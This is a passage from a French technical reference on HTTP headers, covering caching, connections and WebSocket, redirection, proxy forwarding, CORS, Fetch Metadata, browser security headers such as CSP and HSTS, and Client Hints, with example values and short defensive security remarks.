| `s-maxage=N` | Idem mais **pour caches partagés** (CDN, proxy) — prioritaire sur `max-age` |
| `no-cache` | Peut être stockée mais **doit être revalidée** (`If-None-Match`…) avant chaque réutilisation |
| `no-store` | **Ne rien stocker** nulle part (données sensibles) |
| `public` | Cachable par tous (même avec `Authorization`) |
| `private` | Cachable **uniquement** par le navigateur de l'utilisateur, pas par les caches partagés |
| `must-revalidate` | Une fois périmée, **doit** être revalidée (jamais servie périmée) |
| `proxy-revalidate` | Comme `must-revalidate`, mais pour caches partagés seulement |
| `no-transform` | Les intermédiaires ne doivent pas modifier le corps (compression d'images mobiles…) |
| `immutable` | Ne change jamais tant qu'elle est fraîche → pas de revalidation (fichiers `app.3f9a2.js`) |
| `stale-while-revalidate=N` | Sert la version périmée **pendant N s** tout en rafraîchissant en arrière-plan |
| `stale-if-error=N` | Sert la version périmée pendant N s si le serveur d'origine est en erreur |
| `must-understand` | Ne stocker que si le cache comprend le code de statut ; à combiner avec `no-store` |

**Directives de requête :** `max-age=N` (n'accepte que du contenu plus jeune que N s), `max-stale[=N]` (accepte du périmé), `min-fresh=N` (veut du frais pour au moins N s encore), `no-cache` (force revalidation), `no-store`, `no-transform`, `only-if-cached` (répond depuis le cache seulement, sinon `504`), `stale-if-error`.

```http
HTTP/1.1 200 OK
Cache-Control: public, max-age=31536000, immutable
```
```http
Cache-Control: private, no-cache, must-revalidate
```

**Traitement :** le cache calcule la fraîcheur `age < max-age` ; si périmée, envoie une requête conditionnelle (`If-None-Match`) au serveur, qui répond `304 Not Modified` (sans corps) ou `200` avec la nouvelle version.

##### `Expires` — RÉP
Date absolue de péremption (`Expires: Thu, 01 Dec 2026 16:00:00 GMT`). **Ignoré si `Cache-Control: max-age` est présent.** `Expires: 0` ou date passée = déjà périmé.

##### `Pragma` — REQ+RÉP *(obsolète)*
Seule valeur : `no-cache` (équivalent HTTP/1.0 de `Cache-Control: no-cache`). Conservé pour compatibilité.

##### `Age` — RÉP
Secondes écoulées depuis la génération/validation de la réponse par le serveur d'origine, ajouté par les caches.

```http
Age: 3600
```

##### `ETag` — RÉP
**Rôle :** identifiant opaque de la version d'une ressource (hash, numéro de révision).
**Formes :** `"33a64df5"` (**forte** : identité octet à octet) · `W/"0815"` (**faible** : sémantiquement équivalente).

```http
ETag: "33a64df551425fcc55e4d42a148795d9f25f89d4"
```

##### `Last-Modified` — RÉP
Date de dernière modification (`Last-Modified: Tue, 15 Nov 2026 12:45:26 GMT`), moins précise (1 s) que l'ETag.

##### `If-None-Match` — REQ
**Rôle :** requête conditionnelle « ne renvoie que si ta version diffère ». Valeur : un ou plusieurs ETag, ou `*`.

```http
GET /style.css HTTP/1.1
If-None-Match: "33a64df5", W/"0815"
```

**Traitement serveur :** compare (comparaison **faible** autorisée pour `GET`/`HEAD`) → identique : `304 Not Modified` ; différent : `200` + corps. Avec `PUT` et `*` : « ne crée que si la ressource n'existe pas » (`412 Precondition Failed` sinon).

##### `If-Match` — REQ
Condition **d'exécution** : ne réalise l'opération que si l'ETag correspond (comparaison **forte**). Sert à l'*optimistic locking*.

```http
PUT /articles/42 HTTP/1.1
If-Match: "v17"
```
**Traitement :** ETag actuel ≠ `"v17"` → `412 Precondition Failed` (quelqu'un a modifié la ressource entre-temps).

##### `If-Modified-Since` / `If-Unmodified-Since` — REQ
Équivalents basés sur la date : `If-Modified-Since` (GET/HEAD → `304` si non modifiée depuis) et `If-Unmodified-Since` (renvoie `412` si modifiée depuis).

```http
If-Modified-Since: Tue, 15 Nov 2026 12:45:26 GMT
```

##### `Range` — REQ
**Syntaxe :** `bytes=début-fin` ; `bytes=500-` (à partir de 500) ; `bytes=-500` (500 derniers octets) ; `bytes=0-99,200-299` (multi-plages).

```http
GET /video.mp4 HTTP/1.1
Range: bytes=1000000-1999999
```

**Traitement serveur :** `206 Partial Content` + `Content-Range` ; plage invalide → `416 Range Not Satisfiable` ; `Range` non supporté → ignore et renvoie `200` complet.

##### `If-Range` — REQ
Combine `Range` + condition : si l'ETag/la date correspond, renvoie la plage ; sinon renvoie la ressource **entière** (`200`).

```http
Range: bytes=500-
If-Range: "33a64df5"
```

##### `Clear-Site-Data` — RÉP
**Valeurs (entre guillemets) :** `"cache"`, `"cookies"`, `"storage"` (localStorage, sessionStorage, IndexedDB…), `"executionContexts"` (recharge les contextes), `"prefetchCache"`, `"prerenderCache"`, `"*"` (tout).

```http
Clear-Site-Data: "cache", "cookies", "storage"
```

**Usage :** typiquement sur la réponse de `/logout` pour purger toutes les données locales.

##### `CDN-Cache-Control` / `Surrogate-Control` / `Cache-Status` / `No-Vary-Search` — RÉP
| En-tête | Rôle et exemple |
|---|---|
| `CDN-Cache-Control` (RFC 9213) | Directives réservées **aux CDN** : `CDN-Cache-Control: max-age=600` |
| `Surrogate-Control` | Idem (Varnish/Fastly, historique) : `Surrogate-Control: max-age=3600` |
| `Cache-Status` (RFC 9211) | Décrit ce que chaque cache a fait : `Cache-Status: CDN; hit; ttl=300` |
| `No-Vary-Search` | Paramètres d'URL à ignorer pour le cache : `No-Vary-Search: params=("utm_source")` |

---

#### 2.2.8 Connexion, protocole et transport

##### `Connection` — REQ+RÉP (hop-by-hop)
**Valeurs :** `keep-alive` (connexion persistante, défaut HTTP/1.1), `close` (fermer après cette réponse), `upgrade` (avec `Upgrade`), ou une **liste de noms d'en-têtes hop-by-hop** à retirer.

```http
Connection: keep-alive
```
**Traitement :** le serveur réutilise la connexion TCP pour les requêtes suivantes ; `close` → il la ferme après la réponse. Interdit en HTTP/2 et HTTP/3.

##### `Keep-Alive` — REQ+RÉP (hop-by-hop)
**Paramètres :** `timeout=<s>` (inactivité maximale), `max=<n>` (nombre de requêtes maximum).

```http
Keep-Alive: timeout=5, max=1000
```

##### `Upgrade` — REQ+RÉP (hop-by-hop)
**Rôle :** proposer un autre protocole sur la même connexion. **Valeurs :** `websocket`, `h2c` (HTTP/2 en clair), `TLS/1.3`, `HTTP/2.0`…

```http
GET /chat HTTP/1.1
Connection: Upgrade
Upgrade: websocket
```
**Traitement :** si accepté → `101 Switching Protocols` et la connexion change de protocole ; sinon il ignore et répond en HTTP normal.

##### `HTTP2-Settings` — REQ *(obsolète avec h2c)*
Paramètres HTTP/2 encodés en base64url, envoyés avec `Upgrade: h2c`.

##### `Alt-Svc` / `Alt-Used` — RÉP / REQ
**Rôle :** annonce un service alternatif (typiquement HTTP/3 sur QUIC).
**Paramètres :** `ma=<s>` (durée de validité, défaut 24 h), `persist=1` (survit aux changements de réseau) ; valeur spéciale `clear` (oublier les alternatives).

```http
Alt-Svc: h3=":443"; ma=86400, h2="alt.example.com:443"
```
```http
Alt-Used: alt.example.com:443
```

**Traitement :** le navigateur tente la connexion alternative aux requêtes suivantes et indique celle utilisée avec `Alt-Used`.

##### En-têtes de l'*handshake* WebSocket — RFC 6455
| En-tête | Sens | Rôle et exemple |
|---|---|---|
| `Sec-WebSocket-Key` | REQ | Nonce aléatoire base64 : `dGhlIHNhbXBsZSBub25jZQ==` |
| `Sec-WebSocket-Accept` | RÉP | `base64(SHA-1(Key + "258EAFA5-E914-47DA-95CA-C5AB0DC85B11"))` : prouve que le serveur comprend WebSocket |
| `Sec-WebSocket-Version` | REQ (et RÉP si non supportée) | `13` (seule version valide) |
| `Sec-WebSocket-Protocol` | REQ+RÉP | Sous-protocoles applicatifs : `chat, superchat` (le serveur en choisit **un**) |
| `Sec-WebSocket-Extensions` | REQ+RÉP | Extensions : `permessage-deflate; client_max_window_bits` |

```http
HTTP/1.1 101 Switching Protocols
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Accept: s3pPLMBiTxaQ9kYGzzhZRbK+xOo=
```
**Sécurité :** vérifier `Origin` pendant le handshake (*Cross-Site WebSocket Hijacking*).

---

#### 2.2.9 Redirection, statut et métadonnées de réponse

##### `Location` — RÉP
URL de redirection (`3xx`) ou de la nouvelle ressource (`201 Created`).

```http
HTTP/1.1 301 Moved Permanently
Location: https://www.example.com/nouvelle-page
```
**Traitement client :** suit la redirection (`301`/`308` permanentes, `302`/`303`/`307` temporaires ; `307`/`308` conservent la méthode). **Sécurité :** ne jamais construire `Location` depuis une entrée utilisateur non validée (*open redirect*, injection CRLF).

##### `Refresh` — RÉP *(non standard)*
`Refresh: 5; url=https://example.com/` → recharge ou redirige après N secondes.

##### `Retry-After` — RÉP
**Valeurs :** un nombre de secondes **ou** une date HTTP. Utilisé avec `503`, `429`, `301`.

```http
HTTP/1.1 429 Too Many Requests
Retry-After: 120
```

##### `Allow` — RÉP
Liste des méthodes supportées ; obligatoire avec `405 Method Not Allowed`.

```http
HTTP/1.1 405 Method Not Allowed
Allow: GET, HEAD, OPTIONS
```

##### `Server` — RÉP
Logiciel du serveur d'origine (`Server: nginx/1.27.0`). **Sécurité :** divulgue la version → à masquer (`server_tokens off;`).

##### `Date` — REQ+RÉP
Date/heure de création du message au format **IMF-fixdate**, toujours en GMT.

```http
Date: Wed, 30 Sep 2026 08:15:00 GMT
```

##### `Link` — REQ+RÉP (RFC 8288)
**Rôle :** relations entre ressources.
**Valeurs de `rel` courantes :** `preload`, `prefetch`, `preconnect`, `dns-prefetch`, `modulepreload`, `prerender`, `stylesheet`, `canonical`, `alternate`, `next`, `prev`, `first`, `last`, `author`, `license`, `help`, `icon`, `manifest`, `terms-of-service`.

```http
Link: </css/main.css>; rel=preload; as=style, <https://cdn.example.com>; rel=preconnect
```
**Traitement :** utilisé avec `103 Early Hints` (RFC 8297) pour que le navigateur précharge les ressources pendant que le serveur prépare la vraie réponse.

##### `Server-Timing` — RÉP
**Rôle :** expose des métriques de performance serveur dans les outils de développement.

```http
Server-Timing: db;dur=53.2, cache;desc="Cache Read";dur=2.1, app;dur=47.2
```

##### `Timing-Allow-Origin` — RÉP
Origines autorisées à lire les détails de timing d'une ressource (`Resource Timing API`). Valeurs : `*` ou liste d'origines. `Timing-Allow-Origin: https://app.example.com`

##### `SourceMap` — RÉP
Indique l'URL de la *source map* d'un fichier JS/CSS (`SourceMap: /assets/app.js.map`). *(`X-SourceMap` est l'ancien nom.)*

##### `Sunset` / `Deprecation` — RÉP
`Deprecation: @1735689600` (date de dépréciation, timestamp structuré) et `Sunset: Wed, 31 Dec 2026 23:59:59 GMT` (date de retrait définitif de l'API), généralement accompagnés d'un `Link: <…>; rel="deprecation"`.

##### `Content-Location`, `Accept-Ranges`, `Allow`, `Vary`
*Voir §§ 2.2.3 et 2.2.4.*

---

#### 2.2.10 Proxy, répartiteurs de charge et transfert d'informations client

> ⚠️ Tous ces en-têtes sont **falsifiables par le client** : le proxy frontal doit **les écraser** (et non les compléter) à l'entrée, ou ne les accepter que depuis des IP de confiance.

##### `Forwarded` — REQ (RFC 7239, standard)
**Paramètres :** `for=` (client d'origine), `by=` (proxy), `host=` (Host d'origine), `proto=` (`http`/`https`). Les IPv6 sont entre crochets et guillemets.

```http
Forwarded: for=192.0.2.60;proto=https;by=203.0.113.43, for="[2001:db8:cafe::17]"
```

##### `X-Forwarded-For` — REQ *(de facto)*
Liste d'IP : `client, proxy1, proxy2` (chaque proxy ajoute l'IP qu'il voit).

```http
X-Forwarded-For: 203.0.113.195, 70.41.3.18, 150.172.238.178
```
**Traitement :** l'application prend l'IP « de confiance » la plus à droite après avoir retiré ses propres proxys connus (Nginx `real_ip_header X-Forwarded-For; set_real_ip_from …;`). **Ne jamais utiliser la 1ʳᵉ valeur pour un contrôle d'accès ou un rate limiting sans validation** : elle est contrôlée par le client.

##### `X-Forwarded-Host` / `X-Forwarded-Proto` / `X-Forwarded-Port` / `X-Forwarded-Prefix` — REQ
Hôte, protocole (`http`/`https`), port et préfixe de chemin **d'origine** avant le proxy. `X-Forwarded-Proto: https` sert au back-end à générer des URLs HTTPS et à marquer `Secure` les cookies ; `X-Forwarded-Prefix: /api` indique un préfixe retiré par le proxy.

##### `X-Real-IP` / `Client-IP` / `True-Client-IP` / `CF-Connecting-IP` / `Fastly-Client-IP` / `X-Client-IP` / `X-Cluster-Client-IP` — REQ
IP du client posée par un proxy/CDN spécifique (Nginx, Cloudflare, Akamai, Fastly…). Fiables **uniquement** si le trafic ne peut arriver que par ce proxy.

```http
CF-Connecting-IP: 198.51.100.7
```

##### `Via` — REQ+RÉP
Liste des intermédiaires traversés : `protocole hôte`.

```http
Via: 1.1 vegur, 1.1 varnish (Varnish/7.5), 2 cloudfront.net
```
**Traitement :** évite les boucles de proxy et aide au diagnostic.

##### `Proxy-Status` — RÉP (RFC 9209)
Explique pourquoi un proxy a produit une erreur : `Proxy-Status: ExampleCDN; error=connection_timeout`.

##### `X-Original-URL` / `X-Rewrite-URL` / `X-Original-Forwarded-For` — REQ
URL ou IP avant réécriture par IIS/reverse proxy. **Sécurité :** ont été exploités pour contourner des contrôles d'accès — à filtrer côté frontal.

##### `X-Requested-With` — REQ
Valeur classique : `XMLHttpRequest`. Historiquement utilisé pour distinguer une requête AJAX d'une navigation ; non fiable comme protection CSRF (mais ajoute une barrière car déclenche un *preflight* CORS cross-origin).

##### `X-HTTP-Method-Override` / `X-HTTP-Method` / `X-Method-Override` — REQ
Permet de tunneler `PUT`/`PATCH`/`DELETE` dans un `POST` (pare-feux, clients limités) :

```http
POST /users/5 HTTP/1.1
X-HTTP-Method-Override: DELETE
```
**Traitement :** le framework traite la requête comme `DELETE`. **Sécurité :** ne l'activer que pour `POST`, et vérifier les droits sur la méthode effective.

##### `X-CSRF-Token` / `X-XSRF-TOKEN` / `X-CSRFToken` — REQ
Jeton anti-CSRF renvoyé par le JavaScript (lu depuis un cookie `XSRF-TOKEN` ou une balise `<meta>`).

```http
X-CSRF-Token: XYZ789
```
**Traitement :** le serveur compare avec le jeton associé à la session ; différent/absent → `403`.

##### `X-Request-ID` / `X-Correlation-ID` / `X-Amzn-Trace-Id` / `X-Cloud-Trace-Context` — REQ+RÉP
Identifiant de traçage bout en bout. Le serveur le réutilise ou le génère, l'insère dans ses logs et le renvoie dans la réponse.

##### `traceparent` / `tracestate` / `baggage` — REQ (W3C Trace Context / Baggage)
```http
traceparent: 00-0af7651916cd43dd8448eb211c80319c-b7ad6b7169203331-01
tracestate: vendor1=opaqueValue1,vendor2=opaqueValue2
baggage: userId=alice,tenant=acme
```
`traceparent` = `version-trace-id(32 hex)-parent-id(16 hex)-flags` (`01` = échantillonné). Alimente l'observabilité distribuée (OpenTelemetry).

---

#### 2.2.11 CORS (Cross-Origin Resource Sharing)

*Flux : pour une requête « non simple » (méthode ≠ GET/HEAD/POST, en-têtes personnalisés, `Content-Type: application/json`…), le navigateur envoie d'abord une **requête de pré-vérification** `OPTIONS` (*preflight*).*

```http
OPTIONS /api/data HTTP/1.1
Host: api.example.com
Origin: https://app.example.com
Access-Control-Request-Method: PUT
Access-Control-Request-Headers: content-type, x-api-key
```
```http
HTTP/1.1 204 No Content
Access-Control-Allow-Origin: https://app.example.com
Access-Control-Allow-Methods: GET, PUT, DELETE
Access-Control-Allow-Headers: content-type, x-api-key
Access-Control-Allow-Credentials: true
Access-Control-Max-Age: 7200
Vary: Origin
```

| En-tête | Sens | Valeurs possibles et traitement |
|---|---|---|
| `Access-Control-Request-Method` | REQ | Méthode que la vraie requête utilisera (`PUT`…). Le serveur vérifie qu'elle est autorisée. |
| `Access-Control-Request-Headers` | REQ | En-têtes personnalisés que la vraie requête enverra. |
| `Access-Control-Request-Private-Network` | REQ | `true` : accès d'un site public vers un réseau privé (PNA). |
| `Access-Control-Allow-Origin` | RÉP | `*` (toutes origines, **incompatible avec les credentials**) · une origine précise `https://app.example.com` · `null` (**à éviter**). Un seul nom d'origine autorisé par réponse → on le calcule dynamiquement depuis `Origin` (liste blanche) + `Vary: Origin`. |
| `Access-Control-Allow-Methods` | RÉP | Liste de méthodes ou `*` (hors credentials). |
| `Access-Control-Allow-Headers` | RÉP | Liste d'en-têtes de requête autorisés ou `*` (hors credentials ; `Authorization` doit être listé explicitement). |
| `Access-Control-Allow-Credentials` | RÉP | Seule valeur valide : `true` (autorise cookies/`Authorization` ; interdit d'utiliser `*` ailleurs). |
| `Access-Control-Expose-Headers` | RÉP | En-têtes de réponse lisibles par le JavaScript (par défaut : seulement `Cache-Control`, `Content-Language`, `Content-Length`, `Content-Type`, `Expires`, `Last-Modified`, `Pragma`). Ex : `X-Total-Count, ETag` ou `*`. |
| `Access-Control-Max-Age` | RÉP | Durée (s) de mise en cache du preflight ; plafonnée par navigateur (ex. 2 h Chrome, 24 h Firefox). `-1` = désactiver. |
| `Access-Control-Allow-Private-Network` | RÉP | `true` : autorise l'accès depuis un site public. |

**Sécurité :** ne jamais refléter aveuglément `Origin` avec `Allow-Credentials: true` (équivaut à ouvrir l'API à tout site).

---

#### 2.2.12 Fetch Metadata (contexte de la requête, non falsifiable par JS)

##### `Sec-Fetch-Site` — REQ
| Valeur | Signification |
|---|---|
| `same-origin` | Même schéma, hôte et port |
| `same-site` | Même site (eTLD+1) mais origine différente |
| `cross-site` | Site totalement différent |
| `none` | Action utilisateur directe (barre d'adresse, favori) |

##### `Sec-Fetch-Mode` — REQ
| Valeur | Signification |
|---|---|
| `navigate` | Navigation entre documents |
| `cors` | Requête CORS (`fetch`, `XHR`) |
| `no-cors` | Requête sans CORS (`<img>`, `<script src>`…) |
| `same-origin` | Requête limitée à la même origine |
| `websocket` | Handshake WebSocket |

##### `Sec-Fetch-Dest` — REQ
Destination de la ressource : `document`, `iframe`, `frame`, `embed`, `object`, `fencedframe`, `script`, `serviceworker`, `sharedworker`, `worker`, `audioworklet`, `paintworklet`, `style`, `image`, `font`, `audio`, `video`, `track`, `manifest`, `report`, `xslt`, `empty` (`fetch`/XHR).

##### `Sec-Fetch-User` — REQ
`?1` uniquement quand la navigation est **déclenchée par une action de l'utilisateur** (clic, saisie d'URL).

##### `Sec-Fetch-Storage-Access` — REQ
Statut d'accès au stockage tiers : `none`, `inactive`, `active`.

```http
Sec-Fetch-Site: cross-site
Sec-Fetch-Mode: no-cors
Sec-Fetch-Dest: image
```

**Traitement serveur (*Resource Isolation Policy*) :**
```text
si Sec-Fetch-Site ∈ {same-origin, same-site, none}  → autoriser
sinon si Sec-Fetch-Mode == navigate ET méthode == GET ET Sec-Fetch-Dest ∉ {object, embed} → autoriser
sinon → refuser (403)   # bloque CSRF, XSSI, Spectre-like leaks
```

---

#### 2.2.13 En-têtes de sécurité renforçant le navigateur

##### `Strict-Transport-Security` (HSTS) — RÉP
**Directives :** `max-age=<s>` (durée pendant laquelle le navigateur force HTTPS) · `includeSubDomains` (s'applique aux sous-domaines) · `preload` (éligible à la liste HSTS préchargée — min. 1 an + `includeSubDomains`).

```http
Strict-Transport-Security: max-age=63072000; includeSubDomains; preload
```
**Traitement navigateur :** convertit d'office toute future requête `http://` en `https://` et refuse de passer outre une erreur de certificat. Ignoré en HTTP simple.

##### `Content-Security-Policy` (CSP) & `Content-Security-Policy-Report-Only` — RÉP
**Rôle :** liste blanche des sources autorisées → défense principale contre XSS et injections. La variante `Report-Only` **n'applique pas** la politique mais envoie des rapports (phase de test).

**Directives de chargement (fetch directives) :**

| Directive | Contrôle |
|---|---|
| `default-src` | Valeur de repli pour toutes les directives `*-src` |
| `script-src` (`-elem`, `-attr`) | JavaScript (balises / attributs `onclick`) |
| `style-src` (`-elem`, `-attr`) | CSS (feuilles / attributs `style`) |
| `img-src` | Images et favicons |
| `font-src` | Polices |
| `connect-src` | `fetch`, XHR, WebSocket, EventSource, `sendBeacon` |
| `media-src` | `<audio>`, `<video>`, `<track>` |
| `object-src` | `<object>`, `<embed>` (à mettre à `'none'`) |
| `frame-src` / `child-src` / `worker-src` | Cadres imbriqués / cadres+workers / workers |
| `manifest-src` | Manifeste d'application web |
| `prefetch-src` | Préchargement *(dépréciée)* |

**Directives de document et de navigation :**

| Directive | Rôle |
|---|---|
| `base-uri` | URLs autorisées pour `<base>` |
| `form-action` | Cibles autorisées des formulaires |
| `frame-ancestors` | Qui peut **m'inclure** dans une frame (remplace `X-Frame-Options`) |
| `sandbox` | Bac à sable (valeurs plus bas) |
| `upgrade-insecure-requests` | Réécrit `http://` en `https://` pour les sous-ressources |
| `block-all-mixed-content` | Bloque le contenu mixte *(dépréciée)* |
| `require-trusted-types-for 'script'` / `trusted-types` | Impose les *Trusted Types* (anti DOM-XSS) |
| `report-to` / `report-uri` | Destination des rapports (`report-uri` déprécié) |

**Valeurs de sources :**

| Valeur | Signification |
|---|---|
| `'none'` | Rien n'est autorisé |
| `'self'` | Même origine que le document |
| `https:` / `data:` / `blob:` | Schéma entier |
| `example.com`, `*.example.com`, `https://cdn.example.com/lib.js` | Hôte, sous-domaines, URL précise |
| `*` | Tout (sauf `data:`, `blob:`, `filesystem:`) |
| `'nonce-<base64>'` | Autorise les balises portant ce nonce **à usage unique par réponse** |
| `'sha256-…'`, `'sha384-…'`, `'sha512-…'` | Autorise un script/style inline selon son hash |
| `'strict-dynamic'` | Confiance propagée aux scripts chargés par un script déjà de confiance ; ignore les listes d'hôtes |
| `'unsafe-inline'` | Autorise inline (**affaiblit fortement** la protection) |
| `'unsafe-eval'` | Autorise `eval()`, `new Function` |
| `'wasm-unsafe-eval'` | Autorise la compilation WebAssembly |
| `'unsafe-hashes'` | Autorise des gestionnaires inline via hash |
| `'report-sample'` | Inclut un extrait du code fautif dans le rapport |
| `'inline-speculation-rules'` | Autorise les `<script type="speculationrules">` inline |

**Valeurs de `sandbox` :** *(vide = tout restreint)* puis autorisations : `allow-forms`, `allow-modals`, `allow-orientation-lock`, `allow-pointer-lock`, `allow-popups`, `allow-popups-to-escape-sandbox`, `allow-presentation`, `allow-same-origin`, `allow-scripts`, `allow-storage-access-by-user-activation`, `allow-top-navigation`, `allow-top-navigation-by-user-activation`, `allow-top-navigation-to-custom-protocols`, `allow-downloads`.

```http
Content-Security-Policy: default-src 'self'; script-src 'self' 'nonce-r4nd0m' 'strict-dynamic'; img-src 'self' data: https:; object-src 'none'; base-uri 'none'; frame-ancestors 'none'; report-to csp-endpoint
```
**Traitement :** le serveur génère un **nonce différent à chaque réponse** et l'insère dans l'en-tête et dans `<script nonce="r4nd0m">`. Le navigateur bloque toute ressource/exécution non conforme et envoie un rapport de violation.

##### `X-Frame-Options` — RÉP *(remplacé par `frame-ancestors`)*
| Valeur | Effet |
|---|---|
| `DENY` | Jamais affichable dans une frame |
| `SAMEORIGIN` | Frame autorisée pour la même origine seulement |
| `ALLOW-FROM uri` | **Obsolète**, ignoré par les navigateurs modernes |

Protège du **clickjacking**.

##### `X-Content-Type-Options` — RÉP
Seule valeur : `nosniff`. Interdit au navigateur de deviner le type MIME (bloque un script servi en `text/plain`, une feuille de style sans `text/css`).

##### `X-XSS-Protection` — RÉP *(obsolète)*
Valeurs : `0` (désactivé — **recommandé aujourd'hui**), `1` (filtre activé), `1; mode=block` (bloque la page), `1; report=<uri>`. Les anciens filtres introduisaient eux-mêmes des failles ; utiliser CSP.

##### `Referrer-Policy` — RÉP
| Valeur | Ce qui est envoyé dans `Referer` |
|---|---|
| `no-referrer` | Jamais |
| `no-referrer-when-downgrade` | URL complète sauf HTTPS → HTTP |
| `origin` | Origine seulement (`https://example.com/`) |
| `origin-when-cross-origin` | URL complète en same-origin, origine seule en cross-origin |
| `same-origin` | URL complète en same-origin, rien en cross-origin |
| `strict-origin` | Origine seulement, rien si HTTPS → HTTP |
| `strict-origin-when-cross-origin` | **Défaut des navigateurs modernes** : complète en same-origin, origine en cross-origin, rien si downgrade |
| `unsafe-url` | Toujours l'URL complète (**fuites**) |

```http
Referrer-Policy: strict-origin-when-cross-origin
```

##### `Cross-Origin-Opener-Policy` (COOP) — RÉP
| Valeur | Effet |
|---|---|
| `unsafe-none` | Défaut, aucun isolement |
| `same-origin-allow-popups` | Isole des popups cross-origin sauf ceux ouverts par cette page |
| `same-origin` | Isole strictement : groupe de contexte de navigation propre |
| `noopener-allow-popups` | Coupe la relation `window.opener` avec les documents ouverts ultérieurement |

Protège des attaques *XS-Leaks* et permet l'isolation cross-origin.

##### `Cross-Origin-Embedder-Policy` (COEP) — RÉP
`unsafe-none` (défaut) · `require-corp` (les ressources tierces doivent explicitement s'ouvrir via CORP/CORS) · `credentialless` (charge les ressources cross-origin **sans cookies**). COOP `same-origin` + COEP `require-corp`/`credentialless` = **isolation cross-origin** (déverrouille `SharedArrayBuffer`, timers haute résolution).

##### `Cross-Origin-Resource-Policy` (CORP) — RÉP
`same-origin` · `same-site` · `cross-origin` : qui peut **charger** cette ressource (protège images/scripts contre l'inclusion par des sites tiers).

*(Variantes `Cross-Origin-Opener-Policy-Report-Only` et `Cross-Origin-Embedder-Policy-Report-Only` : mode test.)*

##### `Permissions-Policy` — RÉP *(anciennement `Feature-Policy`)*
**Rôle :** active/désactive des fonctionnalités du navigateur pour le document et ses iframes.
**Syntaxe :** `fonctionnalité=(liste-blanche)`.
**Listes blanches :** `*` (toutes origines) · `()` (personne = désactivé) · `self` · `"https://a.example"` (origine précise) · `src` (uniquement pour l'iframe concernée, dans l'attribut `allow`).
**Fonctionnalités :** `accelerometer`, `ambient-light-sensor`, `autoplay`, `battery`, `bluetooth`, `browsing-topics`, `camera`, `clipboard-read`, `clipboard-write`, `display-capture`, `encrypted-media`, `fullscreen`, `geolocation`, `gyroscope`, `hid`, `identity-credentials-get`, `idle-detection`, `local-fonts`, `magnetometer`, `microphone`, `midi`, `otp-credentials`, `payment`, `picture-in-picture`, `publickey-credentials-create`, `publickey-credentials-get`, `screen-wake-lock`, `serial`, `speaker-selection`, `storage-access`, `usb`, `web-share`, `window-management`, `xr-spatial-tracking`… *(l'ancien `interest-cohort` — FLoC — est abandonné)*.

```http
Permissions-Policy: camera=(), microphone=(self), geolocation=(self "https://maps.example.com"), fullscreen=*
```

##### `Document-Policy` / `Require-Document-Policy` — RÉP / REQ
Contrôle des fonctionnalités de performance/comportement (ex. `Document-Policy: js-profiling`), et exigence qu'une frame embarquée respecte une politique.

##### `Origin-Agent-Cluster` — RÉP
`?1` : demande d'isoler l'origine dans son propre agent (processus/thread), interdit `document.domain`.

##### `X-DNS-Prefetch-Control` — RÉP
`on` (active la résolution DNS anticipée des liens de la page) · `off` (désactive, meilleure confidentialité).

##### `X-Permitted-Cross-Domain-Policies` — RÉP
Contrôle Flash/PDF (Adobe) : `none` · `master-only` · `by-content-type` · `by-ftp-filename` · `all`. Valeur recommandée : `none`.

##### `X-Download-Options` — RÉP *(IE8)*
`noopen` : masque le bouton « Ouvrir » sur un téléchargement (évite l'exécution dans le contexte du site).

##### `X-UA-Compatible` — RÉP *(historique IE)*
`IE=edge` (dernier moteur), `IE=11`, `chrome=1`… Sans effet dans les navigateurs récents.

##### `X-Robots-Tag` — RÉP
Directives d'indexation pour moteurs de recherche (utile pour PDF/images).
**Valeurs :** `all` · `noindex` · `nofollow` · `none` (= `noindex, nofollow`) · `noarchive` · `nosnippet` · `notranslate` · `noimageindex` · `unavailable_after: <date>` · `max-snippet:<n>` · `max-image-preview:none|standard|large` · `max-video-preview:<n>` · `indexifembedded`. Peut être préfixé d'un user-agent : `googlebot: noindex`.

```http
X-Robots-Tag: noindex, nofollow
```

##### `Expect-CT` / `Public-Key-Pins` / `Public-Key-Pins-Report-Only` — RÉP *(retirés)*
`Expect-CT` (Certificate Transparency, inutile depuis 2021+) et HPKP (épinglage de clé publique, retiré pour son risque de « bricker » un site) : **ne plus utiliser**.

---

#### 2.2.14 Client Hints (remplacent progressivement `User-Agent`)

**Mécanisme :** le serveur déclare ce qu'il veut recevoir via `Accept-CH` (et `Critical-CH` pour forcer un rechargement immédiat) ; le navigateur envoie ensuite les indices demandés. Les indices *basse entropie* (`Sec-CH-UA`, `-Mobile`, `-Platform`) sont envoyés par défaut.

```http
HTTP/1.1 200 OK
Accept-CH: Sec-CH-UA-Platform-Version, Sec-CH-UA-Model, Sec-CH-Prefers-Color-Scheme
Critical-CH: Sec-CH-Prefers-Color-Scheme
Vary: Sec-CH-Prefers-Color-Scheme
```

| En-tête (REQ) | Valeurs / exemple | Utilité côté serveur |
|---|---|---|
| `Sec-CH-UA` | `"Chromium";v="130", "Not?A_Brand";v="99"` | Marque et version majeure du navigateur |
| `Sec-CH-UA-Mobile` | `?0` / `?1` | Appareil mobile |
| `Sec-CH-UA-Platform` | `"Windows"`, `"macOS"`, `"Linux"`, `"Android"`, `"iOS"`, `"Chrome OS"` | Système d'exploitation |
| `Sec-CH-UA-Platform-Version` | `"15.0.0"` | Version de l'OS |
| `Sec-CH-UA-Full-Version-List` | `"Chromium";v="130.0.6723.58"` | Versions complètes (remplace `Sec-CH-UA-Full-Version`, obsolète) |
| `Sec-CH-UA-Arch` | `"x86"`, `"arm"` | Architecture CPU |
| `Sec-CH-UA-Bitness` | `"64"` | 32/64 bits |
| `Sec-CH-UA-Model` | `"Pixel 8"` | Modèle d'appareil mobile |
| `Sec-CH-UA-WoW64` | `?1` | Navigateur 32 bits sur Windows 64 bits |
| `Sec-CH-UA-Form-Factors` | `"Desktop"`, `"Mobile"`, `"Tablet"`, `"XR"`, `"Automotive"`, `"EInk"` | Format de l'appareil |
| `Sec-CH-Prefers-Color-Scheme` | `light` / `dark` | Thème préféré |
| `Sec-CH-Prefers-Reduced-Motion` | `no-preference` / `reduce` | Réduction des animations |
| `Sec-CH-Prefers-Reduced-Transparency` | `no-preference` / `reduce` | Réduction de la transparence |
| `Sec-CH-DPR` / `DPR` | `2.0` | Densité de pixels (servir des images @2x) |
| `Sec-CH-Width` / `Width` | `640` | Largeur voulue de l'image (px) |
| `Sec-CH-Viewport-Width` / `Viewport-Width` | `1280` | Largeur de la fenêtre |
| `Sec-CH-Viewport-Height` | `720` | Hauteur de la fenêtre |
